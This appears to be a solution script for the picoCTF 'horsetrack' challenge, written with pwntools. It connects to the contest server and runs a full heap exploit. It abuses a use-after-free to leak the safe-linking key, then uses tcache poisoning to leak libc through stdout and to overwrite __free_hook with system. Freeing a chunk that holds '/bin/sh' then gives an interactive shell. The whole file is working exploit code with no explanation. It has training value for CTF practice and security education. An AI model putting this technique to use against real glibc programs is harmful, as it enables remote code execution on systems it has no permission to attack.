from pwn import *
context.log_level = 'debug'
e = ELF('./horsetrack')
libc = ELF('./libc.so.6')
isRemote = True
if isRemote:
    r = remote('saturn.picoctf.net', 50299) 
else:
    r = process('./horsetrack')
    #r = gdb.debug('./horsetrack', 'b system\nc')

def add_horse(i, length, data):
    r.recvuntil(b'Choice: ')
    r.sendline(b'1')
    r.sendline(str(i).encode())
    r.recvuntil(b'?')
    r.sendline(str(length).encode())
    r.sendline(data)
def remove_horse(i):
    r.recvuntil(b'Choice: ')
    r.sendline(b'2')
    r.recvuntil(b'?')
    r.sendline(str(i).encode())
def race():
    r.recvuntil(b'Choice: ')
    r.sendline(b'3')
    if isRemote: r.recvline()
def do_exit():
    r.recvuntil(b'Choice: ')
    r.sendline(b'4')
def cheat(i, spot, data):
    r.recvuntil(b'Choice: ')
    r.sendline(b'0')
    r.recvuntil(b'?')
    r.sendline(str(i).encode())
    r.sendline(data)
    r.recvuntil(b'?')
    r.sendline(str(spot).encode())
add_horse(0, 16, b'a'*16)
remove_horse(0)
add_horse(0, 16, b'\xff')
for _ in range(4):
    add_horse(_ + 1, 16, b'a'*16)
print('racing')
race()

c = b'\x20'
while c[0] == 0x20:
    c = r.recv(1)
key = u16(c+r.recv(1))
print('aslr leak:', hex(key))

# in preparation 
add_horse(13, 16, b'/bin/sh\x00'+b'\xff')

# has_cheated = false
add_horse(5, 16, b'\xff')
add_horse(6, 16, b'\xff')
remove_horse(5)
remove_horse(6)
cheat(6, 0, p64(e.sym['stdout']^key)+b'\xff')
add_horse(7, 16, b'\xff')
add_horse(8, 16, b'\xff')

add_horse(5, 16, b'\xff')
add_horse(6, 16, b'\xff')
remove_horse(5)
remove_horse(6)
cheat(6, 0, p64(0x004040e0^key)+b'\xff')
add_horse(9, 16, b'\xff')
add_horse(10, 16, b'\x00'*16)
print('libc leak')
race()
for _ in range(8): r.recvline()
c = b'\x20'
while c[0] == 0x20:
    c = r.recv(1)
libc_leak = u64(c+r.recv(5)+b'\x00\x00')
libc.address = libc_leak - libc.sym['_IO_2_1_stdout_']
print('stdout =', hex(libc_leak))
print('libc.address =', hex(libc.address))
add_horse(5, 16, b'\xff')
add_horse(6, 16, b'\xff')
remove_horse(5)
remove_horse(6)
cheat(6, 0, p64(libc.sym['__free_hook']^key)+b'\xff')
add_horse(11, 16, b'\xff')
add_horse(12, 16, p64(e.plt['system'])+b'\xff')
remove_horse(13)

r.interactive()



